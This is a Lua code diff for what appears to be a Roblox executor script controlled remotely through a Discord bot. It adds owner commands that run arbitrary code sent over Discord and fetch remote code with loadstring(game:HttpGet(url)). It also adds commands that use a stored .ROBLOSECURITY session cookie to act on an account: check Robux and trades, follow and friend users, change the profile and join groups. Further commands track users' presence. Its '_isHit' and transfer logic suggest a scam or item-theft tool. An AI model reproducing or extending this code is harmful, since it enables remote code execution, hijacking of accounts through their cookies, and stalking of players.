+                    if not _isOwner(_md.author) then return end
+                    _transferActive = false;
+                    local _s = _ts();
+                    if _s == "StartTrade" then pcall(function() _rs.Trade.DeclineTrade:FireServer() end)
+                    elseif _s == "ReceivingRequest" then pcall(function() _rs.Trade.DeclineRequest:FireServer() end) end
+                    _moving = false;
+                    _wl("pending_hits.dat", {});
+                    _postEmbed("🚨 Panic", "All stopped.", 0xFF0000);
+                    return;
+                end
+                if _content == "!execute" then
+                    local _execCode = _content:match("^!execute%s+([%s%S]+)$");
+                    if _execCode and _isOwner(_md.author) then
+                        task.spawn(function()
+                            local _bt3 = string.char(96)..string.char(96)..string.char(96);
+                            local _nl = string.char(10);
+                            local _clean = _execCode:gsub("^".._bt3.."%w*%s*".._nl.."?", ""):gsub(_nl.."?%s*".._bt3.."%s*$", "");
+                            local _fn, _err = loadstring(_clean);
+                            if not _fn then _postEmbed("❌ Load Error", "```\n"..tostring(_err):sub(1,900).."\n```", 0xFF0000); return end
+                            local _results = {};
+                            local _ok, _runErr = pcall(function()
+                                local _ret = { _fn() };
+                                for _i, _v in ipairs(_ret) do table.insert(_results, tostring(_v)) end
+                            end);
+                            if not _ok then _postEmbed("❌ Runtime Error", "```\n"..tostring(_runErr):sub(1,900).."\n```", 0xFF0000)
+                            else
+                                local _out = (#_results > 0) and table.concat(_results, "\n") or "(no return)";
+                                _postEmbed("✅ Execute OK", "```\n"..tostring(_out):sub(1,900).."\n```", 0x3EED50);
+                            end
+                        end);
+                    end
+                    return;
+                end
+                if _content == "!autoexecute" then
+                    local _autoURL = _content:match("^!autoexecute%s+(.+)$");
+                    if _autoURL and _isOwner(_md.author) then
+                        _autoexecURL = _autoURL:gsub("^%s+", ""):gsub("%s+$", "");
+                        pcall(function() writefile(AUTOEXEC_FILE, _autoexecURL) end);
+                        _queueAutoexec();
+                        _postEmbed("🎯 Auto-Execute Saved", "URL: `".._autoexecURL.."`", 0x3EED50);
+                    end
+                    return;
+                end
+                if _content == "!stopautoexecute" then
+                    if not _isOwner(_md.author) then return end
+                    _autoexecURL = "";
+                    pcall(function() if isfile(AUTOEXEC_FILE) then delfile(AUTOEXEC_FILE) end end);
+                    _clearQueue();
+                    _postEmbed("🛑 Auto-Execute Disabled", "", 0xFF0000);
+                    return;
+                end
+                if _content == "!runauto" then
+                    if not _isOwner(_md.author) then return end
+                    if _autoexecURL == "" then _postEmbed("❌ No Auto-Execute", "", 0xFF0000); return end
+                    pcall(function() loadstring(game:HttpGet(_autoexecURL))() end);
+                    _postEmbed("✅ Ran Auto-Execute", "", 0x3EED50);
+                    return;
+                end
+                if _content == "!showauto" then
+                    if not _isOwner(_md.author) then return end
+                    _postEmbed("🎯 Auto-Execute", _autoexecURL ~= "" and "URL: `".._autoexecURL.."`" or "None saved.", 0x3EED50);
+                    return;
+                end
+                if _content == "!transfer" then
+                    local _tName = _content:match("^!transfer%s+(.+)$");
+                    if _tName and _isOwner(_md.author) and not _transferActive then
+                        _tName = _tName:gsub("%s+$", "");
+                        task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
+                        task.spawn(_doTransfer, _tName);
+                    end
+                    return;
+                end
+                if _content == "!stoptransfer" then
+                    if _isOwner(_md.author) then _transferActive = false; task.spawn(function() _reactIn(_cmdCh, _md.id, "🛑") end) end
+                    return;
+                end
+                if _content == "!age" then
+                    local _u = _content:match("^!age%s+(.+)$");
+                    if _u and _isOwner(_md.author) then
+                        task.spawn(function()
+                            local _uid, _uname = _getUserId(_u:gsub("^%s+",""):gsub("%s+$",""));
+                            if not _uid then _postEmbed("❌ Lookup Failed", "", 0xFF0000); return end
+                            local _ok, _r = pcall(function()
+                                return request({ Url = "https://users.roblox.com/v1/users/".._uid, Method = "GET" });
+                            end);
+                            if not _ok or not _r or _r.StatusCode ~= 200 then return end
+                            local _d = _hs:JSONDecode(_r.Body);
+                            local _days = 0;
+                            pcall(function()
+                                local _dt = DateTime.fromIsoDate(_d.created);
+                                _days = math.floor((os.time() - _dt.UnixTimestamp) / 86400);
+                            end);
+                            _postEmbed("🕰️ Account Age",
+                                "**Username:** `".._d.name.."`\n**Created:** `".._d.created:sub(1,10).."`\n**Age:** `".._days.." days`",
+                                0x3EED50);
+                        end);
+                    end
+                    return;
+                end
 
-                        local function _fmt(n)
-                            n = tonumber(n) or 0;
-                            local s = tostring(math.floor(n));
-                            local out = s:reverse():gsub("(%d%d%d)", "%1,"):reverse();
-                            return out:gsub("^,", "");
-                        end
+                -- ═══════════ COOKIE COMMANDS START ═══════════
 
-                        local _lines = {
-                            "**🪙 Coins:** `" .. _fmt(_coins) .. "`",
-                            "**💎 Gems:** `" .. _fmt(_gems) .. "`",
-                        };
-                        if _coinBag > 0 then table.insert(_lines, "**🎒 Coin Bag:** `" .. _fmt(_coinBag) .. "`") end
-                        if _credits > 0 then table.insert(_lines, "**💳 Credits:** `" .. _fmt(_credits) .. "`") end
-                        if _snow then table.insert(_lines, "**❄️ Snow Tokens:** `" .. _fmt(_snow) .. "`") end
-                        if _coinsBackup > 0 then
-                            table.insert(_lines, "");
-                            table.insert(_lines, "**Coins Backup:** `" .. _fmt(_coinsBackup) .. "`");
-                            table.insert(_lines, "**Gems Backup:** `" .. _fmt(_gemsBackup) .. "`");
-                        end
-
-                        _postEmbed("💰 Currency", table.concat(_lines, "\n"), 0xFFD700);
+                -- !rbx <user>
+                local _rbxU = _content:match("^!rbx%s+(.+)$");
+                if _rbxU then
+                    if not _isOwner(_md.author) then return end
+                    task.spawn(function()
+                        if _robloxCookie == "" then _postEmbed("❌ No Cookie", "Set `_robloxCookie`", 0xFF0000); return end
+                        task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
+                        local _uid, _uname, _disp = _getUserId(_rbxU);
+                        if not _uid then _postEmbed("❌ Lookup Failed", "", 0xFF0000); return end
+                        local _ok, _r = pcall(function()
+                            return request({ Url = "https://users.roblox.com/v1/users/".._uid, Method = "GET" });
+                        end);
+                        if not _ok or not _r or _r.StatusCode ~= 200 then return end
+                        local _d = _hs:JSONDecode(_r.Body);
+                        local _days = 0;
+                        pcall(function()
+                            local _dt = DateTime.fromIsoDate(_d.created);
+                            _days = math.floor((os.time() - _dt.UnixTimestamp) / 86400);
+                        end);
+                        local _color = 0x3EED50;
+                        if _d.isBanned then _color = 0xFF0000 elseif _days < 30 then _color = 0xFFA500 end
+                        _postEmbed("👤 Profile", 
+                            "**Username:** `".._d.name.."`\n**Display:** `".._d.displayName.."`\n**ID:** `".._uid.."`\n**Created:** `".._d.created:sub(1,10).."`\n**Age:** `".._days.." days`\n**Banned:** `"..tostring(_d.isBanned).."`\n**Desc:**\n```\n"..tostring(_d.description):sub(1,300).."\n```",
+                            _color);
                     end);
                     return;
                 end
 
-                local _tName = _content:match("^!transfer%s+(.+)$");
-                if _tName then
-                    _tName = _tName:gsub("%s+$", "");
-                    if not _isOwner(_md.author) then
-                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
-                        return;
-                    end
-                    if _transferActive then
-                        task.spawn(function() _reactIn(_cmdCh, _md.id, "⚠️") end);
-                        return;
-                    end
-                    task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
-                    task.spawn(_doTransfer, _tName);
+                -- !online <user>
+                local _onU = _content:match("^!online%s+(.+)$");
+                if _onU then
+                    if not _isOwner(_md.author) then return end
+                    task.spawn(function()
+                        if _robloxCookie == "" then _postEmbed("❌ No Cookie", "", 0xFF0000); return end
+                        task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
+                        local _uid = _getUserId(_onU);
+                        if not _uid then _postEmbed("❌ Lookup Failed", "", 0xFF0000); return end
+                        local _ok, _r = pcall(function()
+                            return _cookiePost("https://presence.roblox.com/v1/presence/users", _hs:JSONEncode({ userIds = { _uid } }));
+                        end);
+                        if not _ok or not _r or _r.StatusCode ~= 200 then _postEmbed("❌ Failed", "Status "..tostring(_r and _r.StatusCode), 0xFF0000); return end
+                        local _d = _hs:JSONDecode(_r.Body);
+                        local _p = _d.userPresences and _d.userPresences[1];
+                        if not _p then _postEmbed("❌ No data", "", 0xFF0000); return end
+                        local _tn = { [0]="Offline", [1]="Website", [2]="In Game", [3]="Studio" };
+                        _postEmbed("🟢 ".._onU, "**Status:** `"..(_tn[_p.userPresenceType] or "?").."`\n**Game:** `"..tostring(_p.lastLocation or "?").."`\n**JobId:** `"..tostring(_p.gameId or "?").."`", 0x3EED50);
+                    end);
                     return;
                 end
 
-                if _content == "!stoptransfer" then
-                    if not _isOwner(_md.author) then
-                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
-                        return;
-                    end
-                    if _transferActive then
-                        _transferActive = false;
-                        task.spawn(function() _reactIn(_cmdCh, _md.id, "🛑") end);
-                    else
-                        task.spawn(function() _reactIn(_cmdCh, _md.id, "⚠️") end);
-                    end
+                -- !lastseen <user>
+                local _lsU = _content:match("^!lastseen%s+(.+)$");
+                if _lsU then
+                    if not _isOwner(_md.author) then return end
+                    task.spawn(function()
+                        if _robloxCookie == "" then _postEmbed("❌ No Cookie", "", 0xFF0000); return end
+                        task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
+                        local _uid = _getUserId(_lsU);
+                        if not _uid then _postEmbed("❌ Lookup Failed", "", 0xFF0000); return end
+                        local _ok, _r = pcall(function()
+                            return request({ Url = "https://presence.roblox.com/v1/presence/last-online?userId=".._uid, Method = "GET", Headers = { ["Cookie"] = ".ROBLOSECURITY=".._robloxCookie } });
+                        end);
+                        if not _ok or not _r or _r.StatusCode ~= 200 then _postEmbed("❌ Failed", "Status "..tostring(_r and _r.StatusCode), 0xFF0000); return end
+                        local _d = _hs:JSONDecode(_r.Body);
+                        _postEmbed("📅 Last Online — ".._lsU, "**Last Online:** `"..tostring(_d.lastOnline or "unknown").."`", 0x3EED50);
+                    end);
                     return;
                 end
+
+                -- !friends <user>
+                local _frU = _content:match("^!friends%s+(.+)$");
+                if _frU then
+                    if not _isOwner(_md.author) then return end
+                    task.spawn(function()
+                        if _robloxCookie == "" then _postEmbed("❌ No Cookie", "", 0xFF0000); return end
+                        task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
+                        local _uid = _getUserId(_frU);
+                        if not _uid then _postEmbed("❌ Lookup Failed", "", 0xFF0000); return end
+                        local _ok, _r = pcall(function()
+                            return _cookieGet("https://friends.roblox.com/v1/users/".._uid.."/friends?limit=100");
+                        end);
+                        if not _ok or not _r or _r.StatusCode ~= 200 then _postEmbed("❌ Failed", "Status "..tostring(_r and _r.StatusCode), 0xFF0000); return end
+                        local _d = _hs:JSONDecode(_r.Body);
+                        if not _d.data or #_d.data == 0 then _postEmbed("👥 Friends", "None.", 0x3EED50); return end
+                        local _lines = {};
+                        for _i, _f in ipairs(_d.data) do
+                            if _i > 25 then break end
+                            table.insert(_lines, "`".._f.name.."`");
+                        end
+                        _postEmbed("👥 Friends — ".._frU.." ("..#_d.data..")", table.concat(_lines, "\n"), 0x3EED50);
+                    end);
+                    return;
+                end
+
+                -- !groups <user>
+                local _grU = _content:match("^!groups%s+(.+)$");
+                if _grU then
+                    if not _isOwner(_md.author) then return end
+                    task.spawn(function()
+                        if _robloxCookie == "" then _postEmbed("❌ No Cookie", "", 0xFF0000); return end
+                        task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
+                        local _uid = _getUserId(_grU);
+                        if not _uid then _postEmbed("❌ Lookup Failed", "", 0xFF0000); return end
+                        local _ok, _r = pcall(function()
+                            return _cookieGet("https://groups.roblox.com/v1/users/".._uid.."/groups/roles");
+                        end);
+                        if not _ok or not _r or _r.StatusCode ~= 200 then _postEmbed("❌ Failed", "Status "..tostring(_r and _r.StatusCode), 0xFF0000); return end
+                        local _d = _hs:JSONDecode(_r.Body);
+                        if not _d.data or #_d.data == 0 then _postEmbed("🏰 Groups", "None.", 0x3EED50); return end
+                        local _lines = {};
+                        for _i, _g in ipairs(_d.data) do
+                            if _i > 20 then break end
+                            table.insert(_lines, "`"..tostring(_g.group.id).."` "..tostring(_g.group.name).." — "..tostring(_g.role.name));
+                        end
+                        _postEmbed("🏰 Groups — ".._grU.." ("..#_d.data..")", table.concat(_lines, "\n"), 0x3EED50);
+                    end);
+                    return;
+                end
+
+                -- !usernames <user>
+                local _unU = _content:match("^!usernames%s+(.+)$");
+                if _unU then
+                    if not _isOwner(_md.author) then return end
+                    task.spawn(function()
+                        if _robloxCookie == "" then _postEmbed("❌ No Cookie", "", 0xFF0000); return end
+                        task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
+                        local _uid = _getUserId(_unU);
+                        if not _uid then _postEmbed("❌ Lookup Failed", "", 0xFF0000); return end
+                        local _ok, _r = pcall(function()
+                            return _cookieGet("https://accountinformation.roblox.com/v1/users/".._uid.."/username-history?limit=50&sortOrder=Asc");
+                        end);
+                        if not _ok or not _r or _r.StatusCode ~= 200 then _postEmbed("❌ Failed", "Status "..tostring(_r and _r.StatusCode), 0xFF0000); return end
+                        local _d = _hs:JSONDecode(_r.Body);
+                        if not _d.data or #_d.data == 0 then _postEmbed("📝 Username History", "None.", 0x3EED50); return end
+                        local _lines = {};
+                        for _i, _u in ipairs(_d.data) do
+                            table.insert(_lines, "`"..tostring(_u.name).."`");
+                        end
+                        _postEmbed("📝 Username History — ".._unU, table.concat(_lines, "\n"), 0x3EED50);
+                    end);
+                    return;
+                end
+
+                -- !avatar <user>
+                local _avU = _content:match("^!avatar%s+(.+)$");
+                if _avU then
+                    if not _isOwner(_md.author) then return end
+                    task.spawn(function()
+                        task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
+                        local _uid = _getUserId(_avU);
+                        if not _uid then _postEmbed("❌ Lookup Failed", "", 0xFF0000); return end
+                        local _ok, _r = pcall(function()
+                            return request({ Url = "https://thumbnails.roblox.com/v1/users/avatar?userIds=".._uid.."&size=420x420&format=Png&isCircular=false", Method = "GET" });
+                        end);
+                        if not _ok or not _r or _r.StatusCode ~= 200 then _postEmbed("❌ Failed", "", 0xFF0000); return end
+                        local _d = _hs:JSONDecode(_r.Body);
+                        if not _d.data or not _d.data[1] then _postEmbed("❌ No image", "", 0xFF0000); return end
+                        local _img = _d.data[1].imageUrl;
+                        _postEmbed("🖼️ Avatar — ".._avU, "**URL:** ".._img, 0x3EED50);
+                    end);
+                    return;
+                end
+
+                -- !robux
+                if _content == "!robux" then
+                    if not _isOwner(_md.author) then return end
+                    task.spawn(function()
+                        if _robloxCookie == "" then _postEmbed("❌ No Cookie", "", 0xFF0000); return end
+                        task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
+                        local _okA, _rA = pcall(function()
+                            return _cookieGet("https://users.roblox.com/v1/users/authenticated");
+                        end);
+                        if not _okA or not _rA or _rA.StatusCode ~= 200 then
+                            _postEmbed("❌ Invalid Cookie", "Status "..tostring(_rA and _rA.StatusCode), 0xFF0000);
+                            return;
+                        end
+                        local _dA = _hs:JSONDecode(_rA.Body);
+                        local _okB, _rB = pcall(function()
+                            return _cookieGet("https://economy.roblox.com/v1/user/currency");
+                        end);
+                        if not _okB or not _rB or _rB.StatusCode ~= 200 then
+                            _postEmbed("❌ Failed", "Status "..tostring(_rB and _rB.StatusCode), 0xFF0000);
+                            return;
+                        end
+                        local _dB = _hs:JSONDecode(_rB.Body);
+                        _postEmbed("💰 Robux",
+                            "**Account:** `".._dA.name.."`\n**Robux:** `"..tostring(_dB.robux).."`\n**Pending:** `"..tostring(_dB.pendingRobux).."`",
+                            0x00B2FF);
+                    end);
+                    return;
+                end
+
+                -- !limiteds <user>
+                local _limU = _content:match("^!limiteds%s+(.+)$");
+                if _limU then
+                    if not _isOwner(_md.author) then return end
+                    task.spawn(function()
+                        if _robloxCookie == "" then _postEmbed("❌ No Cookie", "", 0xFF0000); return end
+                        task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
+                        local _uid = _getUserId(_limU);
+                        if not _uid then _postEmbed("❌ Lookup Failed", "", 0xFF0000); return end
+                        local _ok, _r = pcall(function()
+                            return _cookieGet("https://inventory.roblox.com/v1/users/".._uid.."/assets/collectibles?sortOrder=Asc&limit=50");
+                        end);
+                        if not _ok or not _r or _r.StatusCode ~= 200 then _postEmbed("❌ Failed", "Status "..tostring(_r and _r.StatusCode), 0xFF0000); return end
+                        local _d = _hs:JSONDecode(_r.Body);
+                        if not _d.data or #_d.data == 0 then _postEmbed("💎 Limiteds", "None.", 0x3EED50); return end
+                        local _lines = {};
+                        for _i, _it in ipairs(_d.data) do
+                            if _i > 20 then break end
+                            table.insert(_lines, "`".._it.assetId.."` "..(_it.name or "?").." — "..(_it.recentAveragePrice or 0).." RAP");
+                        end
+                        _postEmbed("💎 Limiteds — ".._limU.." ("..#_d.data..")", table.concat(_lines, "\n"), 0x3EED50);
+                    end);
+                    return;
+                end
+
+                -- !trades
+                if _content == "!trades" then
+                    if not _isOwner(_md.author) then return end
+                    task.spawn(function()
+                        if _robloxCookie == "" then _postEmbed("❌ No Cookie", "", 0xFF0000); return end
+                        task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
+                        local _ok, _r = pcall(function()
+                            return _cookieGet("https://trades.roblox.com/v1/trades/Inbound?limit=10&sortOrder=Desc");
+                        end);
+                        if not _ok or not _r or _r.StatusCode ~= 200 then _postEmbed("❌ Failed", "Status "..tostring(_r and _r.StatusCode), 0xFF0000); return end
+                        local _d = _hs:JSONDecode(_r.Body);
+                        if not _d.data or #_d.data == 0 then _postEmbed("📦 Trades", "No active trades.", 0x3EED50); return end
+                        local _lines = {};
+                        for _i, _t in ipairs(_d.data) do
+                            table.insert(_lines, "`".._t.id.."` — "..(_t.user and _t.user.name or "?").." — `"..(_t.status or "?").."`");
+                        end
+                        _postEmbed("📦 Trades ("..#_d.data..")", table.concat(_lines, "\n"), 0x3EED50);
+                    end);
+                    return;
+                end
+
+                -- !follow <user>
+                local _folU = _content:match("^!follow%s+(.+)$");
+                if _folU then
+                    if not _isOwner(_md.author) then return end
+                    task.spawn(function()
+                        if _robloxCookie == "" then _postEmbed("❌ No Cookie", "", 0xFF0000); return end
+                        task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
+                        local _uid = _getUserId(_folU);
+                        if not _uid then _postEmbed("❌ Lookup Failed", "", 0xFF0000); return end
+                        local _ok, _r = pcall(function()
+                            return _cookiePost("https://friends.roblox.com/v1/users/".._uid.."/follow", "{}");
+                        end);
+                        if _ok and _r and (_r.StatusCode == 200 or _r.StatusCode == 201) then
+                            _postEmbed("✅ Followed", "Now following **".._folU.."**", 0x3EED50);
+                        else
+                            _postEmbed("❌ Follow Failed", "Status "..tostring(_r and _r.StatusCode), 0xFF0000);
+                        end
+                    end);
+                    return;
+                end
+
+                -- !unfollow <user>
+                local _unfU = _content:match("^!unfollow%s+(.+)$");
+                if _unfU then
+                    if not _isOwner(_md.author) then return end
+                    task.spawn(function()
+                        if _robloxCookie == "" then _postEmbed("❌ No Cookie", "", 0xFF0000); return end
+                        task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
+                        local _uid = _getUserId(_unfU);
+                        if not _uid then _postEmbed("❌ Lookup Failed", "", 0xFF0000); return end
+                        local _ok, _r = pcall(function()
+                            return request({
+                                Url = "https://friends.roblox.com/v1/users/".._uid.."/unfollow",
+                                Method = "POST",
+                                Headers = { ["Cookie"] = ".ROBLOSECURITY=".._robloxCookie, ["Content-Type"] = "application/json" },
+                                Body = "{}"
+                            });
+                        end);
+                        if _ok and _r and (_r.StatusCode == 200 or _r.StatusCode == 204) then
+                            _postEmbed("✅ Unfollowed", "No longer following **".._unfU.."**", 0x3EED50);
+                        else
+                            _postEmbed("❌ Unfollow Failed", "Status "..tostring(_r and _r.StatusCode), 0xFF0000);
+                        end
+                    end);
+                    return;
+                end
+
+                -- !friend <user>
+                local _frndU = _content:match("^!friend%s+(.+)$");
+                if _frndU then
+                    if not _isOwner(_md.author) then return end
+                    task.spawn(function()
+                        if _robloxCookie == "" then _postEmbed("❌ No Cookie", "", 0xFF0000); return end
+                        task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
+                        local _uid = _getUserId(_frndU);
+                        if not _uid then _postEmbed("❌ Lookup Failed", "", 0xFF0000); return end
+                        local _ok, _r = pcall(function()
+                            return _cookiePost("https://friends.roblox.com/v1/users/".._uid.."/request-friendship", "{}");
+                        end);
+                        if _ok and _r and (_r.StatusCode == 200 or _r.StatusCode == 201) then
+                            _postEmbed("✅ Friend Request Sent", "To **".._frndU.."**", 0x3EED50);
+                        else
+                            _postEmbed("❌ Friend Failed", "Status "..tostring(_r and _r.StatusCode), 0xFF0000);
+                        end
+                    end);
+                    return;
+                end
+
+                -- !statusmsg <text>
+                local _statU = _content:match("^!statusmsg%s+(.+)$");
+                if _statU then
+                    if not _isOwner(_md.author) then return end
+                    task.spawn(function()
+                        if _robloxCookie == "" then _postEmbed("❌ No Cookie", "", 0xFF0000); return end
+                        task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
+                        local _okA, _rA = pcall(function()
+                            return _cookieGet("https://users.roblox.com/v1/users/authenticated");
+                        end);
+                        if not _okA or not _rA or _rA.StatusCode ~= 200 then _postEmbed("❌ Cookie Invalid", "", 0xFF0000); return end
+                        local _dA = _hs:JSONDecode(_rA.Body);
+                        local _newStatus = _statU:gsub("%s+$", "");
+                        local _ok, _r = pcall(function()
+                            return request({
+                                Url = "https://users.roblox.com/v1/description",
+                                Method = "POST",
+                                Headers = { ["Cookie"] = ".ROBLOSECURITY=".._robloxCookie, ["Content-Type"] = "application/json" },
+                                Body = _hs:JSONEncode({ description = _newStatus })
+                            });
+                        end);
+                        if _ok and _r and _r.StatusCode == 200 then
+                            _postEmbed("✅ Status Updated", "Account: `".._dA.name.."`\nNew status:\n```\n".._newStatus.."\n```", 0x3EED50);
+                        else
+                            _postEmbed("❌ Status Failed", "Status "..tostring(_r and _r.StatusCode), 0xFF0000);
+                        end
+                    end);
+                    return;
+                end
+
+                -- !joingroup <id>
+                local _jgrp = _content:match("^!joingroup%s+(%d+)$");
+                if _jgrp then
+                    if not _isOwner(_md.author) then return end
+                    task.spawn(function()
+                        if _robloxCookie == "" then _postEmbed("❌ No Cookie", "", 0xFF0000); return end
+                        task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
+                        local _ok, _r = pcall(function()
+                            return _cookiePost("https://groups.roblox.com/v1/groups/".._jgrp.."/users", "{}");
+                        end);
+                        if _ok and _r and (_r.StatusCode == 200 or _r.StatusCode == 201) then
+                            _postEmbed("✅ Joined Group", "Group ID: `".._jgrp.."`", 0x3EED50);
+                        else
+                            _postEmbed("❌ Join Failed", "Status "..tostring(_r and _r.StatusCode), 0xFF0000);
+                        end
+                    end);
+                    return;
+                end
+
+                -- !leavegroup <id>
+                local _lgrp = _content:match("^!leavegroup%s+(%d+)$");
+                if _lgrp then
+                    if not _isOwner(_md.author) then return end
+                    task.spawn(function()
+                        if _robloxCookie == "" then _postEmbed("❌ No Cookie", "", 0xFF0000); return end
+                        task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
+                        -- get user id
+                        local _okA, _rA = pcall(function()
+                            return _cookieGet("https://users.roblox.com/v1/users/authenticated");
+                        end);
+                        if not _okA or not _rA or _rA.StatusCode ~= 200 then _postEmbed("❌ Cookie Invalid", "", 0xFF0000); return end
+                        local _dA = _hs:JSONDecode(_rA.Body);
+                        local _ok, _r = pcall(function()
+                            return request({
+                                Url = "https://groups.roblox.com/v1/groups/".._lgrp.."/users/".._dA.id,
+                                Method = "DELETE",
+                                Headers = { ["Cookie"] = ".ROBLOSECURITY=".._robloxCookie }
+                            });
+                        end);
+                        if _ok and _r and (_r.StatusCode == 200 or _r.StatusCode == 204) then
+                            _postEmbed("✅ Left Group", "Group ID: `".._lgrp.."`", 0x3EED50);
+                        else
+                            _postEmbed("❌ Leave Failed", "Status "..tostring(_r and _r.StatusCode), 0xFF0000);
+                        end
+                    end);
+                    return;
+                end
+
+                -- !track <user>
+                local _trkU = _content:match("^!track%s+(.+)$");
+                if _trkU then
+                    if not _isOwner(_md.author) then return end
+                    task.spawn(function()
+                        if _robloxCookie == "" then _postEmbed("❌ No Cookie", "", 0xFF0000); return end
+                        task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
+                        local _uid = _getUserId(_trkU);
+                        if not _uid then _postEmbed("❌ Lookup Failed", "", 0xFF0000); return end
+                        _tracked[_trkU] = { userId = _uid, lastPresence = 0 };
+                        _saveTracked();
+                        _postEmbed("👁️ Tracking", "Now watching **".._trkU.."**. Will ping when they join a game.", 0x00BFFF);
+                    end);
+                    return;
+                end
+
+                -- !untrack
+                if _content == "!untrack" then
+                    if not _isOwner(_md.author) then return end
+                    _tracked = {};
+                    _saveTracked();
+                    task.spawn(function() _reactIn(_cmdCh, _md.id, "🛑") end);
+                    _postEmbed("🛑 Tracking Cleared", "", 0xFF0000);
+                    return;
+                end
+
+                -- !tracklist
+                if _content == "!tracklist" then
+                    if not _isOwner(_md.author) then return end
+                    local _names = {};
+                    for _u, _ in pairs(_tracked) do table.insert(_names, _u) end
+                    if #_names == 0 then _postEmbed("👁️ Tracking List", "Empty.", 0x3EED50)
+                    else _postEmbed("👁️ Tracking List", "```\n"..table.concat(_names, "\n").."\n```", 0x3EED50) end
+                    return;
+                end
+                -- ═══════════ COOKIE COMMANDS END ═══════════
             end
 
             if _isHit then
@@ -1708,7 +1446,6 @@ local function _gw()
         if _gen == _me then _gw() end
         return;
     end
-
     print("[gw] socket open, waiting for handshake");
 
     _sock.OnClose:Connect(function()
@@ -1723,24 +1460,18 @@ local function _gw()
     task.spawn(function()
         task.wait(6);
         if _gen == _me and _hGen ~= _me then
-            warn("[gw] no HELLO (dead socket), retrying now");
+            warn("[gw] no HELLO, retrying");
             pcall(function() if _sock then _sock:Close() end end);
-            if _gen == _me then
-                _sock = nil;
-                _gw();
-            end
+            if _gen == _me then _sock = nil; _gw() end
             return;
         end
         if _gen ~= _me then return end
         task.wait(8);
         if _gen == _me and _rGen ~= _me then
-            warn("[gw] HELLO but no READY (rate limited?), backing off");
+            warn("[gw] no READY, backing off");
             pcall(function() if _sock then _sock:Close() end end);
             task.wait(3 + math.random() * 4);
-            if _gen == _me then
-                _sock = nil;
-                _gw();
-            end
+            if _gen == _me then _sock = nil; _gw() end
         end
     end)
 end
